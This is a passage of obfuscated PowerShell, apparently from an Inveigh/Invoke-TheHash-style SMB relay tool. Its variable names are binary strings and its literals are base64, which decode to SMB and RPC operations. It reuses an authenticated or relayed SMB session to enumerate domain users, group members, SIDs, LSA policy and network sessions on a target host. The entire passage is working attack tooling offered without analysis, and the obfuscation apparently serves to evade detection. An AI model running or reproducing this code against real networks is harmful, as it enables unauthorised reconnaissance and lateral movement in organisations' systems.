                        Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwArAF0AIAAkAHsAMAAxADEAMAAwADAAMQAxADAAMAAwADAAMQAwADAAMAAxAH0AIABzAHUAYwBjAGUAcwBzAGYAdQBsAGwAeQAgAGEAdQB0AGgAZQBuAHQAaQBjAGEAdABlAGQAIABvAG4AIAAkAFQAYQByAGcAZQB0AA==')))
                        ${10001010110010100} = $true
                    }
                    else
                    {
                        echo $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAhAF0AIAAkAHsAMAAxADEAMAAwADAAMQAxADAAMAAwADAAMQAwADAAMAAxAH0AIABmAGEAaQBsAGUAZAAgAHQAbwAgAGEAdQB0AGgAZQBuAHQAaQBjAGEAdABlACAAbwBuACAAJABUAGEAcgBnAGUAdAA=')))
                        ${10001010110010100} = $false
                    }
                }
            }
            catch
            {
                echo "[-] $($_.Exception.Message)"
                ${10001010110010100} = $false
            }
        }
    }
    if(${10001010110010100} -or ${00001011000111111})
    {
        if(${00001011000111111})
        {
            if(${00001011000111111} -and $inveigh.session_lock_table[$session] -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bABvAGMAawBlAGQA'))))
            {
                echo $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAqAF0AIABQAGEAdQBzAGkAbgBnACAAZAB1AGUAIAB0AG8AIABJAG4AdgBlAGkAZwBoACAAUgBlAGwAYQB5ACAAcwBlAHMAcwBpAG8AbgAgAGwAbwBjAGsA')))
                sleep -s 2
            }
            $inveigh.session_lock_table[$session] = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bABvAGMAawBlAGQA')))
            ${00101111101110011} = $inveigh.session_socket_table[$session]
            ${00010110101011010} = ${00101111101110011}.GetStream()
            ${10111101001010100} = $inveigh.session_table[$session]
            ${01000100011101010} =  $inveigh.session_message_ID_table[$session]
            ${10111010000000010} = 0x00,0x00,0x00,0x00
            ${10010001011010000} = $false
        }
        if($Action -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBsAGwA'))))
        {
            ${01011011111111111} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZwByAG8AdQBwAA==')))
        }
        else
        {
            ${01011011111111111} = $Action    
        }
        ${10001011000000101} = "\\" + $Target + $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XABJAFAAQwAkAA==')))
        ${01110011000011011} = [System.Text.Encoding]::Unicode.GetBytes(${10001011000000101})
        ${01001011101111011} = 0
        ${10010111110010011} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VAByAGUAZQBDAG8AbgBuAGUAYwB0AA==')))
        while (${10010111110010011} -ne $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AGkAdAA='))))
        {
            try
            {
                switch (${10010111110010011})
                {
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBsAG8AcwBlAFIAZQBxAHUAZQBzAHQA')))
                    {
                        ${01000100011101010}++
                        ${10010110101010100} = ${10010111110010011}
                        ${00011010101110011} = _01000000010000001 0x06,0x00 0x01,0x00 ${10010001011010000} ${01000100011101010} ${01101100100111010} ${10111010000000010} ${10111101001010100}
                        ${01111100101100101} = _01111110001110001 ${01101100101001101}
                        ${10100010000101011} = _00010011110111111 ${00011010101110011}
                        ${10111100010001110} = _00010011110111111 ${01111100101100101}
                        ${01011111100010011} = _10110111001100010 ${10100010000101011}.Length ${10111100010001110}.Length
                        ${01000010010000100} = _00010011110111111 ${01011111100010011}
                        if(${10010001011010000})
                        {
                            ${01110000100100001} = ${10100010000101011} + ${10111100010001110}
                            ${01110000000000011} = ${10010101111010000}.ComputeHash(${01110000100100001})
                            ${01110000000000011} = ${01110000000000011}[0..15]
                            ${00011010101110011}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAGcAbgBhAHQAdQByAGUA')))] = ${01110000000000011}
                            ${10100010000101011} = _00010011110111111 ${00011010101110011}
                        }
                        ${00111101101010000} = ${01000010010000100} + ${10100010000101011} + ${10111100010001110}
                        ${10010111110010011} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAG4AZABSAGUAYwBlAGkAdgBlAA==')))
                    }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG4AbgBlAGMAdAAyAA==')))
                    {
                        ${01000100011101010}++
                        ${10010110101010100} = ${10010111110010011}
                        ${00011010101110011} = _01000000010000001 0x0b,0x00 0x01,0x00 ${10010001011010000} ${01000100011101010} ${01101100100111010} ${10111010000000010} ${10111101001010100}
                        ${10000000000000011} = _10110101100101000 $Target
                        ${00000100000001100} = _00010011110111111 ${10000000000000011} 
                        ${01111100101100101} = _10010000011010010 0x17,0xc0,0x11,0x00 ${01101100101001101} ${00000100000001100}.Length 4280
                        ${00111000011010010} = _10000100010100110 0x03 ${00000100000001100}.Length 0 0 0x06,0x00,0x00,0x00 0x00,0x00 0x39,0x00
                        ${00110000110010110} = _00010011110111111 ${00111000011010010}
                        ${10100010000101011} = _00010011110111111 ${00011010101110011}
                        ${10111100010001110} = _00010011110111111 ${01111100101100101} 
                        ${10000000001000000} = ${10111100010001110}.Length + ${00110000110010110}.Length + ${00000100000001100}.Length
                        ${01011111100010011} = _10110111001100010 ${10100010000101011}.Length ${10000000001000000}
                        ${01000010010000100} = _00010011110111111 ${01011111100010011}
                        if(${10010001011010000})
                        {
                            ${01110000100100001} = ${10100010000101011} + ${10111100010001110} + ${00110000110010110} + ${00000100000001100}
                            ${01110000000000011} = ${10010101111010000}.ComputeHash(${01110000100100001})
                            ${01110000000000011} = ${01110000000000011}[0..15]
                            ${00011010101110011}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAGcAbgBhAHQAdQByAGUA')))] = ${01110000000000011}
                            ${10100010000101011} = _00010011110111111 ${00011010101110011}
                        }
                        ${00111101101010000} = ${01000010010000100} + ${10100010000101011} + ${10111100010001110} + ${00110000110010110} + ${00000100000001100}
                        ${10010111110010011} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAG4AZABSAGUAYwBlAGkAdgBlAA==')))
                    }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG4AbgBlAGMAdAA1AA==')))
                    {
                        ${01000100011101010}++
                        ${10010110101010100} = ${10010111110010011}
                        ${00011010101110011} = _01000000010000001 0x0b,0x00 0x01,0x00 ${10010001011010000} ${01000100011101010} ${01101100100111010} ${10111010000000010} ${10111101001010100}
                        ${10000000000000011} = _10100001111101000 $Target
                        ${00000100000001100} = _00010011110111111 ${10000000000000011} 
                        ${01111100101100101} = _10010000011010010 0x17,0xc0,0x11,0x00 ${01101100101001101} ${00000100000001100}.Length 4280
                        ${00111000011010010} = _10000100010100110 0x03 ${00000100000001100}.Length 0 0 0x06,0x00,0x00,0x00 0x00,0x00 0x40,0x00
                        ${00110000110010110} = _00010011110111111 ${00111000011010010}
                        ${10100010000101011} = _00010011110111111 ${00011010101110011}
                        ${10111100010001110} = _00010011110111111 ${01111100101100101} 
                        ${10000000001000000} = ${10111100010001110}.Length + ${00110000110010110}.Length + ${00000100000001100}.Length
                        ${01011111100010011} = _10110111001100010 ${10100010000101011}.Length ${10000000001000000}
                        ${01000010010000100} = _00010011110111111 ${01011111100010011}
                        if(${10010001011010000})
                        {
                            ${01110000100100001} = ${10100010000101011} + ${10111100010001110} + ${00110000110010110} + ${00000100000001100}
                            ${01110000000000011} = ${10010101111010000}.ComputeHash(${01110000100100001})
                            ${01110000000000011} = ${01110000000000011}[0..15]
                            ${00011010101110011}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAGcAbgBhAHQAdQByAGUA')))] = ${01110000000000011}
                            ${10100010000101011} = _00010011110111111 ${00011010101110011}
                        }
                        ${00111101101010000} = ${01000010010000100} + ${10100010000101011} + ${10111100010001110} + ${00110000110010110} + ${00000100000001100}
                        ${10010111110010011} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAG4AZABSAGUAYwBlAGkAdgBlAA==')))
                    }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAYQB0AGUAUgBlAHEAdQBlAHMAdAA=')))
                    {
                        ${01000100011101010}++
                        ${10010110101010100} = ${10010111110010011}
                        ${00011010101110011} = _01000000010000001 0x05,0x00 0x01,0x00 ${10010001011010000} ${01000100011101010} ${01101100100111010} ${10111010000000010} ${10111101001010100}
                        ${01111100101100101} = _10000110011000110 ${01001000000111010}
                        ${10100010000101011} = _00010011110111111 ${00011010101110011}
                        ${10111100010001110} = _00010011110111111 ${01111100101100101}  
                        ${01011111100010011} = _10110111001100010 ${10100010000101011}.Length ${10111100010001110}.Length
                        ${01000010010000100} = _00010011110111111 ${01011111100010011}
                        if(${10010001011010000})
                        {
                            ${01110000100100001} = ${10100010000101011} + ${10111100010001110}  
                            ${01110000000000011} = ${10010101111010000}.ComputeHash(${01110000100100001})
                            ${01110000000000011} = ${01110000000000011}[0..15]
                            ${00011010101110011}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAGcAbgBhAHQAdQByAGUA')))] = ${01110000000000011}
                            ${10100010000101011} = _00010011110111111 ${00011010101110011}
                        }
                        ${00111101101010000} = ${01000010010000100} + ${10100010000101011} + ${10111100010001110}
                        try
                        {
                            ${00010110101011010}.Write(${00111101101010000},0,${00111101101010000}.Length) > $null
                            ${00010110101011010}.Flush()
                            ${00010110101011010}.Read(${10110001011001111},0,${10110001011001111}.Length) > $null
                            if(_00010100011010010 ${10110001011001111}[12..15])
                            {
                                ${10010111110010011} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB0AGEAdAB1AHMAUABlAG4AZABpAG4AZwA=')))
                            }
                            else
                            {
                                ${10010111110010011} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB0AGEAdAB1AHMAUgBlAGMAZQBpAHYAZQBkAA==')))
                            }
                        }
                        catch
                        {
                            echo $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAtAF0AIABTAGUAcwBzAGkAbwBuACAAYwBvAG4AbgBlAGMAdABpAG8AbgAgAGkAcwAgAGMAbABvAHMAZQBkAA==')))
                            ${10010111110010011} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AGkAdAA=')))
                        }
                    }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQBuAHUAbQBEAG8AbQBhAGkAbgBVAHMAZQByAHMA')))
                    {
                        ${01000100011101010}++
                        ${10010110101010100} = ${10010111110010011}
                        ${00011010101110011} = _01000000010000001 0x0b,0x00 0x01,0x00 ${10010001011010000} ${01000100011101010} ${01101100100111010} ${10111010000000010} ${10111101001010100}
                        ${10000000000000011} = _00010011011011101 ${01001101100110111}
                        ${00000100000001100} = _00010011110111111 ${10000000000000011} 
                        ${00111000011010010} = _10000100010100110 0x03 ${00000100000001100}.Length 0 0 0x08,0x00,0x00,0x00 0x00,0x00 0x0d,0x00
                        ${01111100101100101} = _10010000011010010 0x17,0xc0,0x11,0x00 ${01101100101001101} ${00000100000001100}.Length 4280
                        ${00110000110010110} = _00010011110111111 ${00111000011010010}
                        ${10100010000101011} = _00010011110111111 ${00011010101110011}
                        ${10111100010001110} = _00010011110111111 ${01111100101100101} 
                        ${10000000001000000} = ${10111100010001110}.Length + ${00110000110010110}.Length + ${00000100000001100}.Length
                        ${01011111100010011} = _10110111001100010 ${10100010000101011}.Length ${10000000001000000}
                        ${01000010010000100} = _00010011110111111 ${01011111100010011}
                        if(${10010001011010000})
                        {
                            ${01110000100100001} = ${10100010000101011} + ${10111100010001110} + ${00110000110010110} + ${00000100000001100}
                            ${01110000000000011} = ${10010101111010000}.ComputeHash(${01110000100100001})
                            ${01110000000000011} = ${01110000000000011}[0..15]
                            ${00011010101110011}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAGcAbgBhAHQAdQByAGUA')))] = ${01110000000000011}
                            ${10100010000101011} = _00010011110111111 ${00011010101110011}
                        }
                        ${00111101101010000} = ${01000010010000100} + ${10100010000101011} + ${10111100010001110} + ${00110000110010110} + ${00000100000001100}
                        ${10010111110010011} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAG4AZABSAGUAYwBlAGkAdgBlAA==')))
                    }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBlAHQATQBlAG0AYgBlAHIAcwBJAG4AQQBsAGkAYQBzAA==')))
                    {
                        ${01000100011101010}++
                        ${10010110101010100} = ${10010111110010011}
                        ${00011010101110011} = _01000000010000001 0x0b,0x00 0x01,0x00 ${10010001011010000} ${01000100011101010} ${01101100100111010} ${10111010000000010} ${10111101001010100}
                        ${10000000000000011} = _00101110100010101 ${00101111101011001}
                        ${00000100000001100} = _00010011110111111 ${10000000000000011} 
                        ${00111000011010010} = _10000100010100110 0x03 ${00000100000001100}.Length 0 0 0x0d,0x00,0x00,0x00 0x00,0x00 0x21,0x00
                        ${01111100101100101} = _10010000011010010 0x17,0xc0,0x11,0x00 ${01101100101001101} ${00000100000001100}.Length 4280
                        ${00110000110010110} = _00010011110111111 ${00111000011010010}
                        ${10100010000101011} = _00010011110111111 ${00011010101110011}
                        ${10111100010001110} = _00010011110111111 ${01111100101100101} 
                        ${10000000001000000} = ${10111100010001110}.Length + ${00110000110010110}.Length + ${00000100000001100}.Length
                        ${01011111100010011} = _10110111001100010 ${10100010000101011}.Length ${10000000001000000}
                        ${01000010010000100} = _00010011110111111 ${01011111100010011}
                        if(${10010001011010000})
                        {
                            ${01110000100100001} = ${10100010000101011} + ${10111100010001110} + ${00110000110010110} + ${00000100000001100}
                            ${01110000000000011} = ${10010101111010000}.ComputeHash(${01110000100100001})
                            ${01110000000000011} = ${01110000000000011}[0..15]
                            ${00011010101110011}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAGcAbgBhAHQAdQByAGUA')))] = ${01110000000000011}
                            ${10100010000101011} = _00010011110111111 ${00011010101110011}
                        }
                        ${00111101101010000} = ${01000010010000100} + ${10100010000101011} + ${10111100010001110} + ${00110000110010110} + ${00000100000001100}
                        ${10010111110010011} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAG4AZABSAGUAYwBlAGkAdgBlAA==')))
                    }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABvAGcAbwBmAGYA')))
                    {
                        ${01000100011101010}++
                        ${10010110101010100} = ${10010111110010011}
                        ${00011010101110011} = _01000000010000001 0x02,0x00 0x01,0x00 ${10010001011010000} ${01000100011101010} ${01101100100111010} ${10111010000000010} ${10111101001010100}
                        ${01111100101100101} = _10110011111010001
                        ${10100010000101011} = _00010011110111111 ${00011010101110011}
                        ${10111100010001110} = _00010011110111111 ${01111100101100101}
                        ${01011111100010011} = _10110111001100010 ${10100010000101011}.Length ${10111100010001110}.Length
                        ${01000010010000100} = _00010011110111111 ${01011111100010011}
                        if(${10010001011010000})
                        {
                            ${01110000100100001} = ${10100010000101011} + ${10111100010001110}
                            ${01110000000000011} = ${10010101111010000}.ComputeHash(${01110000100100001})
                            ${01110000000000011} = ${01110000000000011}[0..15]
                            ${00011010101110011}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAGcAbgBhAHQAdQByAGUA')))] = ${01110000000000011}
                            ${10100010000101011} = _00010011110111111 ${00011010101110011}
                        }
                        ${00111101101010000} = ${01000010010000100} + ${10100010000101011} + ${10111100010001110}
                        ${10010111110010011} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAG4AZABSAGUAYwBlAGkAdgBlAA==')))
                    }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABvAG8AawB1AHAATgBhAG0AZQBzAA==')))
                    {
                        ${01000100011101010}++
                        ${10010110101010100} = ${10010111110010011}
                        ${00011010101110011} = _01000000010000001 0x0b,0x00 0x01,0x00 ${10010001011010000} ${01000100011101010} ${01101100100111010} ${10111010000000010} ${10111101001010100}
                        ${10000000000000011} = _01010100100000000 ${01001101100110111} $Group
                        ${00000100000001100} = _00010011110111111 ${10000000000000011} 
                        ${00111000011010010} = _10000100010100110 0x03 ${00000100000001100}.Length 0 0 0x08,0x00,0x00,0x00 0x00,0x00 0x11,0x00
                        ${01111100101100101} = _10010000011010010 0x17,0xc0,0x11,0x00 ${01101100101001101} ${00000100000001100}.Length 4280
                        ${00110000110010110} = _00010011110111111 ${00111000011010010}
                        ${10100010000101011} = _00010011110111111 ${00011010101110011}
                        ${10111100010001110} = _00010011110111111 ${01111100101100101} 
                        ${10000000001000000} = ${10111100010001110}.Length + ${00110000110010110}.Length + ${00000100000001100}.Length
                        ${01011111100010011} = _10110111001100010 ${10100010000101011}.Length ${10000000001000000}
                        ${01000010010000100} = _00010011110111111 ${01011111100010011}
                        if(${10010001011010000})
                        {
                            ${01110000100100001} = ${10100010000101011} + ${10111100010001110} + ${00110000110010110} + ${00000100000001100}
                            ${01110000000000011} = ${10010101111010000}.ComputeHash(${01110000100100001})
                            ${01110000000000011} = ${01110000000000011}[0..15]
                            ${00011010101110011}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAGcAbgBhAHQAdQByAGUA')))] = ${01110000000000011}
                            ${10100010000101011} = _00010011110111111 ${00011010101110011}
                        }
                        ${00111101101010000} = ${01000010010000100} + ${10100010000101011} + ${10111100010001110} + ${00110000110010110} + ${00000100000001100}
                        ${10010111110010011} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAG4AZABSAGUAYwBlAGkAdgBlAA==')))
                    }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABvAG8AawB1AHAAUgBpAGQAcwA=')))
                    {
                        ${01000100011101010}++
                        ${10010110101010100} = ${10010111110010011}
                        ${00011010101110011} = _01000000010000001 0x0b,0x00 0x01,0x00 ${10010001011010000} ${01000100011101010} ${01101100100111010} ${10111010000000010} ${10111101001010100}
                        ${10000000000000011} = _10111111010001100 ${01001101100110111} ${01010111110001001} ${00100100101100011}
                        ${00000100000001100} = _00010011110111111 ${10000000000000011} 
                        ${00111000011010010} = _10000100010100110 0x03 ${00000100000001100}.Length 0 0 0x0b,0x00,0x00,0x00 0x00,0x00 0x12,0x00
                        ${01111100101100101} = _10010000011010010 0x17,0xc0,0x11,0x00 ${01101100101001101} ${00000100000001100}.Length 4280
                        ${00110000110010110} = _00010011110111111 ${00111000011010010}
                        ${10100010000101011} = _00010011110111111 ${00011010101110011}
                        ${10111100010001110} = _00010011110111111 ${01111100101100101} 
                        ${10000000001000000} = ${10111100010001110}.Length + ${00110000110010110}.Length + ${00000100000001100}.Length
                        ${01011111100010011} = _10110111001100010 ${10100010000101011}.Length ${10000000001000000}
                        ${01000010010000100} = _00010011110111111 ${01011111100010011}
                        if(${10010001011010000})
                        {
                            ${01110000100100001} = ${10100010000101011} + ${10111100010001110} + ${00110000110010110} + ${00000100000001100}
                            ${01110000000000011} = ${10010101111010000}.ComputeHash(${01110000100100001})
                            ${01110000000000011} = ${01110000000000011}[0..15]
                            ${00011010101110011}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAGcAbgBhAHQAdQByAGUA')))] = ${01110000000000011}
                            ${10100010000101011} = _00010011110111111 ${00011010101110011}
                        }
                        ${00111101101010000} = ${01000010010000100} + ${10100010000101011} + ${10111100010001110} + ${00110000110010110} + ${00000100000001100}
                        ${10010111110010011} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAG4AZABSAGUAYwBlAGkAdgBlAA==')))
                    }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABTAEEAQwBsAG8AcwBlAA==')))
                    {
                        ${01000100011101010}++
                        ${10010110101010100} = ${10010111110010011}
                        ${00011010101110011} = _01000000010000001 0x0b,0x00 0x01,0x00 ${10010001011010000} ${01000100011101010} ${01101100100111010} ${10111010000000010} ${10111101001010100}
                        ${01110111001000111} = _10111111100010110 ${10110001111010000}
                        ${10100010001010100} = _00010011110111111 ${01110111001000111} 
                        ${01111100101100101} = _10010000011010010 0x17,0xc0,0x11,0x00 ${01101100101001101} ${10100010001010100}.Length 4280
                        ${00111000011010010} = _10000100010100110 0x03 ${10100010001010100}.Length 0 0 0x04,0x00,0x00,0x00 0x00,0x00 0x00,0x00
                        ${00110000110010110} = _00010011110111111 ${00111000011010010}
                        ${10100010000101011} = _00010011110111111 ${00011010101110011}
                        ${10111100010001110} = _00010011110111111 ${01111100101100101} 
                        ${10000000001000000} = ${10111100010001110}.Length + ${00110000110010110}.Length + ${10100010001010100}.Length
                        ${01011111100010011} = _10110111001100010 ${10100010000101011}.Length ${10000000001000000}
                        ${01000010010000100} = _00010011110111111 ${01011111100010011}
                        if(${10010001011010000})
                        {
                            ${01110000100100001} = ${10100010000101011} + ${10111100010001110} + ${00110000110010110} + ${10100010001010100}
                            ${01110000000000011} = ${10010101111010000}.ComputeHash(${01110000100100001})
                            ${01110000000000011} = ${01110000000000011}[0..15]
                            ${00011010101110011}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAGcAbgBhAHQAdQByAGUA')))] = ${01110000000000011}
                            ${10100010000101011} = _00010011110111111 ${00011010101110011}
                        }
                        ${00111101101010000} = ${01000010010000100} + ${10100010000101011} + ${10111100010001110} + ${00110000110010110} + ${10100010001010100}
                        ${01111110110100101}++
                        ${10010111110010011} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAG4AZABSAGUAYwBlAGkAdgBlAA==')))
                    }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABTAEEATABvAG8AawB1AHAAUwBpAGQAcwA=')))
                    {
                        ${01000100011101010}++
                        ${10010110101010100} = ${10010111110010011}
                        ${00011010101110011} = _01000000010000001 0x0b,0x00 0x01,0x00 ${10010001011010000} ${01000100011101010} ${01101100100111010} ${10111010000000010} ${10111101001010100}
                        ${01110111001000111} = _00110000110100001 ${10110001111010000} ${10000100111101101}
                        ${10100010001010100} = _00010011110111111 ${01110111001000111}
                        ${01111100101100101} = _10010000011010010 0x17,0xc0,0x11,0x00 ${01101100101001101} ${10100010001010100}.Length 4280
                        ${00111000011010010} = _10000100010100110 0x03 ${10100010001010100}.Length 0 0 0x10,0x00,0x00,0x00 0x00,0x00 0x0f,0x00
                        ${00110000110010110} = _00010011110111111 ${00111000011010010}   
                        ${10100010000101011} = _00010011110111111 ${00011010101110011}
                        ${10111100010001110} = _00010011110111111 ${01111100101100101} 
                        ${10000000001000000} = ${10111100010001110}.Length + ${00110000110010110}.Length + ${10100010001010100}.Length
                        ${01011111100010011} = _10110111001100010 ${10100010000101011}.Length ${10000000001000000}
                        ${01000010010000100} = _00010011110111111 ${01011111100010011}
                        if(${10010001011010000})
                        {
                            ${01110000100100001} = ${10100010000101011} + ${10111100010001110} + ${00110000110010110} + ${10100010001010100}
                            ${01110000000000011} = ${10010101111010000}.ComputeHash(${01110000100100001})
                            ${01110000000000011} = ${01110000000000011}[0..15]
                            ${00011010101110011}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAGcAbgBhAHQAdQByAGUA')))] = ${01110000000000011}
                            ${10100010000101011} = _00010011110111111 ${00011010101110011}
                        }
                        ${00111101101010000} = ${01000010010000100} + ${10100010000101011} + ${10111100010001110} + ${00110000110010110} + ${10100010001010100}
                        ${10010111110010011} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAG4AZABSAGUAYwBlAGkAdgBlAA==')))
                    }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABTAEEATwBwAGUAbgBQAG8AbABpAGMAeQA=')))
                    {
                        ${01000100011101010}++
                        ${10010110101010100} = ${10010111110010011}
                        ${00011010101110011} = _01000000010000001 0x0b,0x00 0x01,0x00 ${10010001011010000} ${01000100011101010} ${01101100100111010} ${10111010000000010} ${10111101001010100}
                        ${01110111001000111} = _01011101001000111
                        ${10100010001010100} = _00010011110111111 ${01110111001000111} 
                        ${01111100101100101} = _10010000011010010 0x17,0xc0,0x11,0x00 ${01101100101001101} ${10100010001010100}.Length 4280
                        ${00111000011010010} = _10000100010100110 0x03 ${10100010001010100}.Length 0 0 0x02,0x00,0x00,0x00 0x00,0x00 0x06,0x00
                        ${00110000110010110} = _00010011110111111 ${00111000011010010}
                        ${10100010000101011} = _00010011110111111 ${00011010101110011}
                        ${10111100010001110} = _00010011110111111 ${01111100101100101} 
                        ${10000000001000000} = ${10111100010001110}.Length + ${00110000110010110}.Length + ${10100010001010100}.Length
                        ${01011111100010011} = _10110111001100010 ${10100010000101011}.Length ${10000000001000000}
                        ${01000010010000100} = _00010011110111111 ${01011111100010011}
                        if(${10010001011010000})
                        {
                            ${01110000100100001} = ${10100010000101011} + ${10111100010001110} + ${00110000110010110} + ${10100010001010100}
                            ${01110000000000011} = ${10010101111010000}.ComputeHash(${01110000100100001})
                            ${01110000000000011} = ${01110000000000011}[0..15]
                            ${00011010101110011}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAGcAbgBhAHQAdQByAGUA')))] = ${01110000000000011}
                            ${10100010000101011} = _00010011110111111 ${00011010101110011}
                        }
                        ${00111101101010000} = ${01000010010000100} + ${10100010000101011} + ${10111100010001110} + ${00110000110010110} + ${10100010001010100}
                        ${10010111110010011} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAG4AZABSAGUAYwBlAGkAdgBlAA==')))
                    }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABTAEEAUQB1AGUAcgB5AEkAbgBmAG8AUABvAGwAaQBjAHkA')))
                    {
                        ${01000100011101010}++
                        ${10010110101010100} = ${10010111110010011}
                        ${00011010101110011} = _01000000010000001 0x0b,0x00 0x01,0x00 ${10010001011010000} ${01000100011101010} ${01101100100111010} ${10111010000000010} ${10111101001010100}
                        ${01110111001000111} = _10110000101100111 ${10110001111010000}
                        ${10100010001010100} = _00010011110111111 ${01110111001000111}
                        ${01111100101100101} = _10010000011010010 0x17,0xc0,0x11,0x00 ${01101100101001101} ${10100010001010100}.Length 4280
                        ${00111000011010010} = _10000100010100110 0x03 ${10100010001010100}.Length 0 0 0x03,0x00,0x00,0x00 0x00,0x00 0x07,0x00
                        ${00110000110010110} = _00010011110111111 ${00111000011010010}   
                        ${10100010000101011} = _00010011110111111 ${00011010101110011}
                        ${10111100010001110} = _00010011110111111 ${01111100101100101} 
                        ${10000000001000000} = ${10111100010001110}.Length + ${00110000110010110}.Length + ${10100010001010100}.Length
                        ${01011111100010011} = _10110111001100010 ${10100010000101011}.Length ${10000000001000000}
                        ${01000010010000100} = _00010011110111111 ${01011111100010011}
                        if(${10010001011010000})
                        {
                            ${01110000100100001} = ${10100010000101011} + ${10111100010001110} + ${00110000110010110} + ${10100010001010100}
                            ${01110000000000011} = ${10010101111010000}.ComputeHash(${01110000100100001})
                            ${01110000000000011} = ${01110000000000011}[0..15]
                            ${00011010101110011}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAGcAbgBhAHQAdQByAGUA')))] = ${01110000000000011}
                            ${10100010000101011} = _00010011110111111 ${00011010101110011}
                        }
                        ${00111101101010000} = ${01000010010000100} + ${10100010000101011} + ${10111100010001110} + ${00110000110010110} + ${10100010001010100}
                        ${10010111110010011} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAG4AZABSAGUAYwBlAGkAdgBlAA==')))
                    }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBlAHQAUwBlAHMAcwBFAG4AdQBtAA==')))
                    {
                        ${01000100011101010}++
                        ${10010110101010100} = ${10010111110010011}
                        ${00011010101110011} = _01000000010000001 0x0b,0x00 0x01,0x00 ${10010001011010000} ${01000100011101010} ${01101100100111010} ${10111010000000010} ${10111101001010100}
                        ${00110011110110010} = _01000110101101100 $Target
                        ${10010010101110000} = _00010011110111111 ${00110011110110010}
                        ${01111100101100101} = _10010000011010010 0x17,0xc0,0x11,0x00 ${01101100101001101} ${10010010101110000}.Length 1024
                        ${00111000011010010} = _10000100010100110 0x03 ${10010010101110000}.Length 0 0 0x02,0x00,0x00,0x00 0x00,0x00 0x0c,0x00                        
                        ${00110000110010110} = _00010011110111111 ${00111000011010010}
                        ${10100010000101011} = _00010011110111111 ${00011010101110011}
                        ${10111100010001110} = _00010011110111111 ${01111100101100101} 
                        ${10000000001000000} = ${10111100010001110}.Length + ${00110000110010110}.Length + ${10010010101110000}.Length
                        ${01011111100010011} = _10110111001100010 ${10100010000101011}.Length ${10000000001000000}
                        ${01000010010000100} = _00010011110111111 ${01011111100010011}
                        if(${10010001011010000})
                        {
                            ${01110000100100001} = ${10100010000101011} + ${10111100010001110} + ${00110000110010110} + ${10010010101110000}
                            ${01110000000000011} = ${10010101111010000}.ComputeHash(${01110000100100001})
                            ${01110000000000011} = ${01110000000000011}[0..15]
                            ${00011010101110011}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAGcAbgBhAHQAdQByAGUA')))] = ${01110000000000011}
                            ${10100010000101011} = _00010011110111111 ${00011010101110011}
                        }
                        ${00111101101010000} = ${01000010010000100} + ${10100010000101011} + ${10111100010001110} + ${00110000110010110} + ${10010010101110000}
                        ${10010111110010011} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAG4AZABSAGUAYwBlAGkAdgBlAA==')))
                    }
